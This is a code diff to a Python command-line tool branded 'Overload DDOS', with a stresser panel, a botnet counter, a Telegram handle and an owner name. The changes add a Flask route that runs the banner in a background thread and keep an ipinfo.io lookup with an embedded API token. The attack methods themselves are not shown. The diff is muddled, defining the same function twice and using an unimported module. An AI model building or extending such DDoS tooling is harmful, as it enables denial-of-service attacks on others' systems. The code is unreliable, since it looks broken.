@@ -9,6 +9,7 @@ import math
 import curses
 import blessed
 import subprocess
+import threading
 from flask import Flask, request, jsonify
 from colorama import Fore, Style
 
@@ -52,8 +53,17 @@ def si():
         clear_screen()
         print(random_color() + logo + "\033[0m")
         time.sleep(0.1)
-                                                             
+        
+app = Flask(__name__)
+
+def get_ip_info(url):
+    response = requests.get(f'https://ipinfo.io/{url}?token=727e8c2fa5b07c')  
+    response.raise_for_status()
+    return response.json()         
+
+@app.route('/')                                                             
 def si():
+    run_si_in_background() 
     print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mt.me/POWERPROOFOVERLOAD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Overload DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0')
     print("")                
 
@@ -110,6 +120,9 @@ def rules():
                 \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
 ''')
 
+def run_si_in_background():
+    threading.Thread(target=si).start()
+    
 def menu():
     sys.stdout.write(f"         \x1b]2;Overload Server --> Online Botnet: [{bots}] | Stresser Panel | VIP (true)\x07")
     clear()
@@ -173,15 +186,7 @@ def main():
             main()    
         elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
             rules()    
-
-app = Flask(__name__)
-
-def get_ip_info(url):
-    response = requests.get(f'https://ipinfo.io/{url}?token=727e8c2fa5b07c')  
-    response.raise_for_status()
-        
-if __name__ == '__main__':
-    app.run(debug=True)                        
+                        
 
 # LAYER 4 METHODS   
 
@@ -605,6 +610,10 @@ Type [CLS] to clear the terminal""")
                 print("Command: [ " + cmmnd + " ] Not Found!")
             except IndexError:
                 pass
+                
+                
+if __name__ == '__main__':
+    app.run(debug=True)                
 
 
 def login():
